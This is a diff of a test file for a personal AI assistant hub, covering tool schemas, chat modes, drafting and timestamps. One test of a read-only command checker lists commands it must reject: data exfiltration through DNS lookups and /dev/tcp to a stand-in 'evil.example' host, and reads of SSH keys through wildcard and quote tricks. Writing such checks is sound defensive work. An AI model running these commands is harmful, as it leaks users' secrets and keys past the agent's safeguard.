@@ -6,7 +6,7 @@ import http from "node:http";
 import { makeHub, TOKEN } from "./helpers.js";
 import { ctxFor, scripted, sse } from "./ai-helpers.js";
 import { setBackendOverride, type AiMessage } from "../src/ai/backends.js";
-import { kindFields, runTool } from "../src/ai/tools.js";
+import { kindFields, runTool, TOOLS } from "../src/ai/tools.js";
 import { addOwnTailnet, commandEnv, findHost, isPrivateHost, isReadOnly, loadHosts, parseSshConfig, type Host, type RunResult } from "../src/ai/hosts.js";
 import { hubSecretValues } from "../src/secrets.js";
 import { planWindow } from "../src/ai/history.js";
@@ -174,6 +174,17 @@ test("create_item: any kind through one tool, with the schema in its description
     assert.match(bad.text, /422/);
     const nope = await runTool(a, { name: "create_item", arguments: { kind: "device", fields: {} } }, ctxFor(t));
     assert.match(nope.text, /kind must be one of/);
+    // Kinds with their own tool are sent there: create_item skipped their checks (a task already open, a riff's tempo).
+    const task = await runTool(a, { name: "create_item", arguments: { kind: "task", fields: { title: "Buy milk", status: "next", order: 1 } } }, ctxFor(t));
+    assert.equal(task.ok, false);
+    assert.match(task.text, /create_task/);
+    const riff = await runTool(a, { name: "create_item", arguments: { kind: "music_idea", fields: { title: "Am F C G" } } }, ctxFor(t));
+    assert.match(riff.text, /music_idea/);
+    assert.equal(t.hub.store.list({ kind: "task" }).length + t.hub.store.list({ kind: "music_idea" }).length, 0);
+    const def = TOOLS.find((x) => x.name === "create_item")!;
+    const kinds = (def.parameters as unknown as { properties: { kind: { enum: string[] } } }).properties.kind.enum;
+    for (const k of ["task", "note", "log", "fact", "journal", "music_idea", "pet_event"]) assert.ok(!kinds.includes(k), k);
+    for (const k of ["event", "checklist", "film", "food_option", "inventory"]) assert.ok(kinds.includes(k), k);
   } finally { t.cleanup(); }
 });
 
@@ -212,6 +223,9 @@ test("hosts: the ways around the read-only check found in the 2026-11-05 review 
     "openssl s_client -connect evil.example:443 -servername secret", "openssl s_client -connect core:443 -sess_out /home/u/.bashrc", "openssl req -new -nodes",
     // Data handed to a server outside the network.
     "dig @evil.example secret", "nslookup secret evil.example", "host secret evil.example", "whois -h evil.example secret", "ping -p deadbeef 10.0.0.1",
+    // Data in the name looked up reaches the servers of its domain.
+    "dig jamie-555-0100.collector.example", "ping -c 1 jamie-555-0100.collector.example", "nslookup x7k2.evil.example", "host secret.evil.example 10.0.0.1",
+    "whois secret.example.org.evil", "traceroute data.evil.example", "mtr --report data.evil.example", "dig TXT secret.evil.example +short",
     "npm view x --registry=https://evil.example", "pip list --outdated --index-url https://evil.example/simple", "cat </dev/tcp/evil.example/80",
     // Secret files reached through wildcards, braces or split quotes, as the shell reads the words.
     "xxd ~/.config/everythingap?/wor?.key", "sed 's/./& /g' ~/.local/share/every*/connections.jso?", "cat ~/.ss?/id_ed2551?", "cat $HOME/.s''sh/id_rsa",
@@ -235,6 +249,7 @@ test("hosts: the ways around the read-only check found in the 2026-11-05 review 
     "journalctl -u smbd -n 50 --no-pager", "ip -br a", "ip -4 route", "less /var/log/syslog", "file /bin/ls", "rg -n error /var/log", "sort -rn f",
     "openssl s_client -connect core:443 -servername core", "openssl x509 -in cert.pem -noout -dates", "dig example.com", "dig @1.1.1.1 example.com", "dig @10.0.0.1 core.lan",
     "nslookup example.com", "host example.com 10.0.0.1", "whois example.com", "ping -c 3 8.8.8.8", "npm view express version", "pip list --outdated",
+    "ping -c 3 google.com", "ping nas01", "dig +short core.lan", "traceroute 1.1.1.1", "nslookup core", "dig -x 8.8.8.8", "mtr -r -c 5 10.0.0.1",
     "ls /var/log/*.log", "du -sh /mnt/B/*", "grep -c 'err*' /var/log/syslog", "ls ~/Documents/*", "find /var/log -name '*.log'",
   ];
   for (const c of linuxReads) assert.equal(isReadOnly(c, "linux"), true, c);
@@ -454,7 +469,7 @@ test("web: search goes through SearXNG JSON, pages come back as clean text", asy
 });
 
 test("drafting: draft_in_my_voice uses the adapter route and returns the draft", async () => {
-  const t = makeHub();
+  const t = makeHub({ adapterUrl: "http://127.0.0.1:9" });
   const b = scripted([
     () => ({ calls: [{ name: "draft_in_my_voice", arguments: { request: "text Devon that I'm running late" } }] }),
     (msgs) => ({ text: msgs.find((m) => m.role === "tool")?.content ?? "" }),
@@ -818,6 +833,19 @@ test("a reply that claims a change no tool made is sent back once to make the ca
   } finally { setBackendOverride(null); t.cleanup(); }
 });
 
+test("a recap the owner asked for is not sent back as a claimed change", async () => {
+  const t = makeHub();
+  const b = scripted([() => ({ text: "Logged your weight at 9 AM and added two tasks: call the vet and order filament." })]);
+  setBackendOverride(b);
+  try {
+    for (const [i, q] of ["what did you add today?", "recap what we changed this week", "did you log my weight this morning?"].entries()) {
+      const before = b.seen.length;
+      await (await t.api("/ai/chat", { method: "POST", json: { session_id: `recap-${i}`, message: q } })).json();
+      assert.equal(b.seen.length - before, 1, `one answer for: ${q}`);
+    }
+  } finally { setBackendOverride(null); t.cleanup(); }
+});
+
 test("a warm-up sends exactly the start a chat sends in any mode, and waits while a chat runs or just ran", async () => {
   const t = makeHub();
   const b = scripted([() => ({ text: "Nothing on the calendar." })]);
@@ -885,4 +913,73 @@ test("a model that stops after a tool already wrote does not get the turn run ag
     assert.equal(out.actions?.[0]?.tool, "save_note");
     assert.equal(t.hub.store.list({ kind: "note" }).filter((n) => n.fields.title === "Silent auction").length, 1);
   } finally { setBackendOverride(null); t.cleanup(); }
+});
+
+test("auto mode: everyday trouble words open troubleshooting only about a machine; a ledger closes when it worked or after a quiet day, and a new one keeps what was ruled out", async () => {
+  const t = makeHub();
+  const b = scripted([() => ({ text: "1. Restart the router." })]);
+  setBackendOverride(b);
+  const chat = async (session: string, message: string) => (await (await t.api("/ai/chat", { method: "POST", json: { session_id: session, message } })).json()) as ChatOutput;
+  const ledgerOf = (session: string) => t.hub.store.list({ kind: "ledger", where: { session_id: session } });
+  try {
+    for (const [i, m] of ["I'm stuck on what to cook tonight", "I have a problem with my landlord", "can you fix this sentence for me?", "my dog won't eat"].entries()) {
+      assert.equal((await chat(`plain-${i}`, m)).mode, "general", m);
+    }
+    for (const [i, m] of ["the printer is stuck again", "there's an issue with the server", "the backup failed last night"].entries()) {
+      assert.equal((await chat(`tech-${i}`, m)).mode, "troubleshoot", m);
+    }
+
+    // It worked: the ledger closes, and the chat goes on as a plain one.
+    assert.equal((await chat("wifi", "the wifi keeps dropping on my laptop")).mode, "troubleshoot");
+    t.hub.store.patch(ledgerOf("wifi")[0].id, { ruled_out: ["Restart the router."] });
+    await chat("wifi", "that worked, thanks!");
+    assert.equal(ledgerOf("wifi")[0].fields.open, false);
+    assert.equal((await chat("wifi", "what should I make for dinner?")).mode, "general");
+    // Broken again in the same chat: a new ledger that still rules out what failed before.
+    assert.equal((await chat("wifi", "the wifi is dropping again, still not working")).mode, "troubleshoot");
+    const open = ledgerOf("wifi").find((l) => l.fields.open !== false)!;
+    assert.deepEqual(open.fields.ruled_out, ["Restart the router."]);
+
+    // A day with no new trouble closes a ledger left open.
+    assert.equal((await chat("quiet", "the NAS share is not mounting")).mode, "troubleshoot");
+    const l = ledgerOf("quiet")[0];
+    t.hub.store.db.prepare("UPDATE entities SET updated_at = ? WHERE id = ?").run(new Date(Date.now() - 2 * 86_400_000).toISOString(), l.id);
+    assert.equal((await chat("quiet", "unrelated: give me a pasta recipe")).mode, "general");
+    assert.equal(t.hub.store.get(l.id)!.fields.open, false);
+  } finally { setBackendOverride(null); t.cleanup(); }
+});
+
+test("drafting: without a voice model the draft tool is not offered and the chat writes the draft in one answer", async () => {
+  const t = makeHub();
+  const b = scripted([() => ({ text: "running 10 late, save me a seat" })]);
+  setBackendOverride(b);
+  try {
+    const out = await (await t.api("/ai/chat", { method: "POST", json: { session_id: "d2", message: "text Devon I'm late" } })).json() as ChatOutput;
+    assert.match(out.reply, /running 10 late/);
+    assert.equal(b.chats.length, 0, "no second model call for the draft");
+    assert.match(b.seen[0][0].content, /write it yourself in their own voice/);
+    assert.doesNotMatch(b.seen[0][0].content, /draft_in_my_voice/);
+  } finally { setBackendOverride(null); t.cleanup(); }
+});
+
+test("log, pet and journal tools keep a time said or captured earlier; a future or broken time is now", async () => {
+  const t = makeHub();
+  try {
+    const a = api(t);
+    const earlier = new Date(Date.now() - 26 * 3_600_000).toISOString();
+    const w = await runTool(a, { name: "log_health", arguments: { type: "weight", value: 181.2, at: earlier } }, ctxFor(t));
+    assert.equal(w.ok, true, w.text);
+    const log = t.hub.store.list({ kind: "log" }).find((l) => l.fields.type === "weight")!;
+    assert.equal(log.fields.at, earlier);
+    await runTool(a, { name: "log_pet", arguments: { type: "vet", note: "checkup", at: earlier } }, ctxFor(t));
+    assert.equal(t.hub.store.list({ kind: "pet_event" })[0].fields.at, earlier);
+    await runTool(a, { name: "journal_entry", arguments: { host: "nas", what: "replaced a drive", at: earlier } }, ctxFor(t));
+    assert.equal(t.hub.store.list({ kind: "journal" })[0].fields.at, earlier);
+    const future = new Date(Date.now() + 3 * 3_600_000).toISOString();
+    await runTool(a, { name: "log_health", arguments: { type: "mood", value: 1, at: future } }, ctxFor(t));
+    const mood = t.hub.store.list({ kind: "log" }).find((l) => l.fields.type === "mood")!;
+    assert.ok(Date.parse(String(mood.fields.at)) <= Date.now(), "a time ahead is not a record: now");
+    await runTool(a, { name: "log_health", arguments: { type: "steps", value: 9000, at: "yesterday-ish" } }, ctxFor(t));
+    assert.ok(Number.isFinite(Date.parse(String(t.hub.store.list({ kind: "log" }).find((l) => l.fields.type === "steps")!.fields.at))));
+  } finally { t.cleanup(); }
 });
